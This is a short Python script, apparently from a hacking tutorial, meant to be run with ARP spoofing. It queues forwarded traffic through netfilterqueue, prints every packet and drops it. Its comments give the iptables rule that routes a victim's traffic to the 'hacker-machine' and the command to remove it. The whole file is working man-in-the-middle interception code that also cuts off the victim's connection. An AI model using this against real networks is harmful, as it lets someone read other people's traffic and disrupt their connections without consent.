#!/usr/bin/python

# Capture and print packets going thrue this computerself.
# Run with arp-spoof
#
# Create a queue to store the network traffic comming to the hacker-machine
# iptables -I FORWARD -j NFQUEUE --queue-num 0
#
# Flush, remove the config from iptables with
# iptables --flush

import netfilterqueue

def process_packet(packet):
    print(packet)
    packet.drop()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # Bind the queue to the queue number assigned in the iptables command
                               # And a callback function called process_packet
queue.run()  # Start the queue
